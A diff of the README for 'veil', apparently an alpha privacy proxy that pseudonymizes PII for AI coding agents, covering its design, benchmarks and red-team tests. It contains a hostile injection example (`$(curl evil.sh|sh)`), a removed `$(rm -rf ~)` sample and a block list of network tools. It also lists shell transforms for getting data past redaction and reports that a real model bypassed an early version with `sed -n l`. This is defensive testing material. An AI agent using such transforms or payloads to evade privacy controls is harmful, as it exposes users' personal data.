@@ -1,25 +1,111 @@
 # veil
 
-**Privacy middleware for AI coding agents.** The model sees consistent pseudonyms; your machine
-keeps the real values.
+[![TestPyPI](https://img.shields.io/badge/TestPyPI-veil--proxy%200.1.0-blue)](https://test.pypi.org/project/veil-proxy/)
+![Python](https://img.shields.io/badge/python-3.11%2B-blue)
+![Status](https://img.shields.io/badge/status-alpha-orange)
+
+**Your AI coding agent reads production-shaped data. veil makes sure the model never sees a real
+person.**
+
+veil is a local privacy proxy for AI coding agents such as Claude Code, Codex CLI and Aider. It
+replaces every real name, email, phone number, address, card number and secret with a consistent
+pseudonym *before* the request leaves your machine. When the agent runs a command or writes code
+locally, veil swaps the real values back in. The model reasons about real bugs; it just never learns
+who they happened to.
+
+### From a real session
+
+This is the same log line, captured during a real Claude Code session against a live model (DeepSeek)
+through veil:
 
 ```text
-what the agent read locally          what the LLM receives                what you see in the answer
----------------------------          ---------------------                ---------------------------
-Leonie Köhler                        First_Ttnx Last_Ttnx                 Leonie Köhler
-leonekohler@surfeu.de                user_ttnx@example.test               leonekohler@surfeu.de
-card=4111 1111 1111 1111             card=card_y2vb                       card=4111 1111 1111 1111
-/Users/alice/code/shop               /Users/user_pjgu/code/shop           /Users/alice/code/shop
+what was on disk   WARN billing.charge duplicate invoice=293 amount=0.99 customer="Leonie Köhler"
+                   email=leonekohler@surfeu.de card=4111 1111 1111 1111 ship_to="Theodor-Heuss-Straße 34" ip=84.191.20.7
+
+what the model got WARN billing.charge duplicate invoice=293 amount=0.99 customer="First_Cfbf Last_Cfbf"
+                   email=user_cfbf@example.test card=card_3kvd ship_to="Cfbf Example Street" ip=192.0.2.28
 ```
 
-Coding agents send everything they read to the model provider: database query results, logs,
-fixtures, stack traces, even your home-directory name. veil is a local proxy that pseudonymizes all
-of it before it leaves your machine. Commands the agent runs get the real values back locally, so it
-can still query your real dev database and fix real bugs.
+The model still found the bug (invoice 293 was charged twice within the same second). Its answer
+came back to the developer with the real name, card number and address restored. The provider saw
+none of them.
 
-> **Status: alpha.** It works end to end with Claude Code, Codex CLI and OpenAI-compatible clients,
-> and it has been tested against real models. It hasn't been used in production yet. See
-> [Limitations](#limitations).
+## Why veil is built for privacy
+
+Every number below comes from our own test runs. The harness that produced them is in this repo and
+can be re-run: see [Prove it yourself](#prove-it-yourself).
+
+**1. It knows your data instead of guessing.** Most redaction tools look for things that *look* like
+PII. veil first learns the actual values from your own data sources (Postgres, MySQL/MariaDB, MongoDB,
+Redis, SQLite, fixture files), then finds them anywhere: logs, JSON, stack traces, free-text notes.
+On 1,000 labelled free-text records (ai4privacy):
+
+| Approach | Names and contact details that got through |
+|---|---|
+| Pattern matching (what regex-based gateways do) | **80.4%** |
+| Patterns + a dedicated PII NER model | 17.6% |
+| **veil seeded from your data** | **1.8%** |
+
+**2. Tested against real agents and real models, not just unit tests.** Four complete agent sessions
+ran against a live model (DeepSeek), totalling 39 model requests, across Claude Code, the Anthropic
+SDK and the OpenAI SDK. Every payload was checked against 463 real values with a scanner that also
+decodes escapes, encodings and transforms. Result: **0 real values reached the provider**, and every
+session still reached the correct diagnosis.
+
+**3. Attacked like an adversary would.** An agent with a shell can transform data before veil sees
+it. We built a bypass matrix of 20 one-command transforms: byte dumps (`od`, `xxd`, `sed -n l`),
+`base64`, escape sequences, `rev`, rot13, upper-casing, one-character-per-line, spaced-out letters,
+truncation with `cut`, and SQL `hex()`, `upper()`, `replace()`, `substr()`, `unicode()`.
+**20 of 20 are contained**: blocked before they run, withheld, or fully redacted. The matrix is part
+of the regression suite. Two lessons came out of this work:
+
+- A real model *did* bypass an early version by printing a log with `sed -n l` (octal escapes plus
+  line wrapping). Our audit caught it, and that class of bypass is now closed and regression-tested.
+- Our first leak checker reported 15/20; once it was taught to decode every transform, the truth was
+  9/20. We fixed the checker before fixing veil. veil's numbers come from an oracle that is harder
+  on veil than veil is on attackers.
+
+**4. Real values can't become code.** Putting a real value back into a shell command turns data into
+code: a customer named `$(curl evil.sh|sh)`, or just `O'Brien`. veil escapes every restored value for
+its exact quoting context (unquoted, `'…'`, `"…"`, or an SQL literal inside a shell string). Of 35
+injection tests, **23 fail without this protection and all 35 pass with it.**
+
+**5. It never writes new PII into your code.** Edit and write tools only get back values that already
+exist in the target file. Web tools, unknown tools and network-capable commands (`curl`, `ssh`,
+`git push`) never receive real values, which shuts the door on prompt-injected exfiltration.
+
+**6. It fails closed.** If redaction errors, the request is refused (HTTP 502); raw data is never
+forwarded as a fallback. A second, independent guard scans the exact outgoing bytes (plain, encoded,
+transformed and truncated values) and repairs or withholds anything the first pass missed. Testing
+with real Claude Code traffic surfaced two protocol corners. An undocumented `safeguards` request field
+carried your home directory; veil now redacts every field it doesn't positively know to be
+configuration. A tool schema with a property literally named `type` crashed redaction; veil refused
+the request rather than leak it.
+
+**7. Privacy that doesn't cost you the model.** Pseudonyms are deterministic, so the conversation
+prefix stays byte-stable and **prompt caching keeps working: 74–89% cache hits** in the real runs.
+At about 40,000 seeded values veil adds **≈ 8 ms of redaction + 11 ms of guard** per
+67,000-character Claude Code request, and hooks answer in **≈ 39 ms**.
+
+**8. Your secrets stay yours, even at rest.** The local vault is AES-256-GCM encrypted, with each
+value bound to its pseudonym. Keys live in the macOS Keychain or the Linux Secret Service. Teams can
+share pseudonyms (the HMAC secret) without ever sharing the vault key.
+
+### How it compares
+
+| | Regex/NER redaction gateways | DLP blockers | Masked database copies | Hook-only redactors | **veil** |
+|---|---|---|---|---|---|
+| Learns the real values from your data | ✗ | ✗ | ✓ (DB only) | ✗ | **✓** |
+| Covers logs, fixtures, free text, paths | partly | ✓ (blocks) | ✗ | partly | **✓** |
+| Agent can still run real queries | ✓ | ✗ | ✗ | partly | **✓** |
+| One stable pseudonym per person (caching, reasoning) | often ✗ ¹ | n/a | ✓ | varies | **✓** |
+| Fails closed | varies | ✓ | ✓ | ✗ ² | **✓** |
+
+¹ For example, LiteLLM's Presidio guardrail (v1.107, by our code review) numbers tokens by position
+within each message, so the same person gets different tokens across messages.
+² Claude Code ignores a hook's rewritten output if its shape is wrong and sends the original instead.
+
+Background research, with sources: [docs/RESEARCH.md](docs/RESEARCH.md).
 
 ## How it works
 
@@ -29,27 +115,15 @@ can still query your real dev database and fix real bugs.
               ◄── rehydrate per tool policy ◄──
 ```
 
-- **Seeding (the core idea).** veil learns the real values from your own data sources: Postgres,
-  MySQL/MariaDB, MongoDB, Redis, SQLite, and fixture files. It classifies fields from native PII
-  labels, column and JSON-path names, and value sampling. It then matches those exact values wherever
-  they appear (logs, free text, JSON, code). Regex and NER guess; seeding knows.
-- **Coherent pseudonyms.** Pseudonyms are deterministic HMAC tokens. Everything about one person
-  shares one code (`user_ab12`, `user_ab12+2@example.test`, `First_Ab12 Last_Ab12`, `Ab12 Example
-  Street`), so the model can still reason about who is who. Because the same input always produces
-  the same pseudonym, prompt caching keeps working (82–89% cache hits in real runs).
-- **Per-tool restore policy.**
-  - Shell, read and grep tools get real values back, escaped for the exact shell or SQL quoting
-    context, so a stored `$(rm -rf ~)` stays data.
-  - Edit and write tools may only restore values that already exist in the target file, so the agent
-    can never write *new* real PII into your code.
-  - Web tools, unknown tools and network-capable commands (`curl`, `ssh`, `git push`) never receive
-    real values.
-- **Outbound guard.** A final check scans every outgoing request, independently of the redaction
-  step. It looks for every known value in plain, encoded (URL, base64, JSON escapes), transformed
-  (reversed, rot13, upper-cased, spaced out, hex) and truncated forms. It repairs what it can and
-  withholds or blocks the rest.
-- **Encrypted local vault.** Real values are stored AES-256-GCM encrypted, with keys in the macOS
-  Keychain or the Linux Secret Service.
+- **Seeding:** classifies fields from native PII labels, column and JSON-path names, and value
+  sampling. It groups one person across tables, collections and stores by unique foreign keys and
+  shared emails or usernames.
+- **Pseudonyms:** deterministic HMAC codes, one per person: `user_ab12`, `user_ab12+2@example.test`,
+  `First_Ab12 Last_Ab12`, `Ab12 Example Street`. Phone numbers and IPs come from fictional ranges.
+- **Tool policy:** shell, read and grep tools get real values back (escaped); edit and write tools
+  only get values that already exist in the file; everything else gets none.
+- **Guard:** an independent final check that repairs or withholds what redaction missed.
+- **Optional NER:** a 46 MB ONNX model for third parties in free text (`veil-proxy[ner]`).
 
 ## Supported clients
 
@@ -64,8 +138,8 @@ One proxy serves all of them, routed by path:
 | Aider, Continue, OpenAI SDK, LiteLLM | OpenAI Chat Completions | `OPENAI_BASE_URL=http://127.0.0.1:8787/v1` |
 
 For Bedrock and Vertex, the client skips its own auth and veil signs requests *after* redacting
-them. Bedrock uses `AWS_BEARER_TOKEN_BEDROCK` or SigV4 (`veil-proxy[bedrock]`); Vertex uses
-`gcloud` or `VEIL_VERTEX_TOKEN`.
+them. Bedrock uses `AWS_BEARER_TOKEN_BEDROCK` or SigV4 (`veil-proxy[bedrock]`); Vertex uses `gcloud`
+or `VEIL_VERTEX_TOKEN`.
 
 ## Install
 
@@ -81,7 +155,7 @@ pip install httpx cryptography pyahocorasick
 Or from source (requires [uv](https://docs.astral.sh/uv/)):
 
 ```sh
-git clone <this repo> && cd veil/prototype
+git clone https://github.com/lemonadesaltbagel/veil.git && cd veil/prototype
 uv sync
 uv run veil --help
 ```
@@ -95,12 +169,6 @@ veil service install          # proxy as a LaunchAgent (macOS) or systemd user u
 veil status ~/code/myapp      # proxy, service, keys, vault, project wiring
 cd ~/code/myapp && claude     # nothing else to configure
 ```
-
-`veil init` merges into existing settings, never overwrites them, and is safe to re-run. It adds
-veil's hooks as a second layer (≈40 ms per call via the running proxy).
-
-**Verify it yourself:** `veil proxy --capture DIR` writes every request exactly as the model received
-it (pseudonyms only).
 
 Seed more sources at any time:
 
@@ -123,49 +191,53 @@ Claude Code accepts only that exact endpoint. It must be installed by an admin i
 `/Library/Application Support/ClaudeCode/managed-settings.d/` (macOS) or
 `/etc/claude-code/managed-settings.d/` (Linux).
 
-## Testing
+## Prove it yourself
+
+Don't take our word for it.
+
+- **See what your model sees.** `veil proxy --capture DIR` writes every request exactly as it left
+  your machine.
+- **Re-run our evidence** from a checkout:
 
 ```sh
 cd prototype
 uv run pytest -q                          # unit + integration tests (DB tests skip when DBs are down)
 scripts/fetch_datasets.sh                 # public sample data (Chinook, MongoDB mflix, Redis users, ai4privacy)
 scripts/dev_dbs.sh start                  # local Postgres (Docker) + MariaDB/Redis/MongoDB (Homebrew)
-uv run veil audit                         # real Claude Code -> veil -> scripted fake model; reports what the model saw
-uv run veil audit --driver codex          # real Codex CLI, same idea (also: --provider bedrock|vertex, --driver openai|sdk)
-uv run python -m veil.redteam             # 20 one-command bypass techniques (byte dumps, rev, rot13, hex(), cut...)
+uv run veil audit                         # real Claude Code -> veil -> scripted model; reports what the model saw
+uv run veil audit --driver codex          # real Codex CLI (also: --provider bedrock|vertex, --driver openai|sdk)
+uv run veil audit --upstream https://api.deepseek.com/anthropic --api-key-env DEEPSEEK_API_KEY --model deepseek-flash
+uv run python -m veil.redteam             # the 20-technique bypass matrix
 uv run python scripts/eval_ai4privacy.py  # free-text leak rates: patterns / +NER / seeded
 ```
 
-Results from the development runs:
-
-| Measurement | Result |
-|---|---|
-| Real Claude Code / OpenAI SDK sessions against DeepSeek | 0 leaks under a decoding leak scan; correct answers |
-| Bypass matrix | 20 / 20 techniques contained |
-| Free-text name/contact leak rate (1,000 labelled rows) | 80% patterns only → 17.6% with NER → **1.8% when seeded** |
-| Overhead at ~40k seeded values | ≈ 8 ms redaction + 11 ms guard per 67k-character request |
+Each audit writes a report with three files per request: what your client sent, what the model
+received, and what the model replied.
 
 ## Limitations
 
+veil is alpha software. We'd rather you know exactly where its edges are:
+
 - **Your machine is trusted.** The vault, the agent's local transcripts (which show real values) and
   local telemetry all hold real data.
-- **Unanticipated transforms.** An agent with a shell can transform data in ways veil doesn't
-  anticipate. veil blocks byte dumps and decodes 20 known transforms, but that's a tested matrix, not
-  a proof.
+- **Unanticipated transforms.** An agent with a shell can invent transforms we haven't anticipated.
+  The bypass matrix is evidence, not proof.
 - **Fragment searches.** A search on *part* of a pseudonym (`LIKE '%ab12%'`) can't match real data.
   veil explains this to the model instead of running the command.
-- **Short values.** Seeded values shorter than 8 characters are only matched verbatim or encoded.
+- **Short values.** Seeded values shorter than 8 characters are matched verbatim or encoded only.
   Standalone first or last names that are common words (`Mark`, `Code`) aren't seeded on their own;
   the full name still is.
 - **Free text about third parties** needs the optional NER model (`veil-proxy[ner]`, then
   `veil ner-model fetch`).
 - **Re-identification.** Quasi-identifiers such as tenant names, rare values and timestamps can still
   allow re-identification.
+- **Cloud providers:** Bedrock and Vertex are verified with the real Claude Code CLI against faithful
+  fake upstreams, not yet against live AWS or GCP accounts.
 
 ## Repository layout
 
 ```text
-docs/RESEARCH.md     landscape, interception points, findings from every test round, limitations
+docs/RESEARCH.md     landscape, interception points, findings from every test round
 docs/DESIGN.md       architecture, token scheme, tool policy, guard, adapters, threat model
 docs/DATABASES.md    seeding: implemented sources, classification signals, other database families
 prototype/veil/      the package (proxy, engine, guard, seeders, API adapters, CLI)
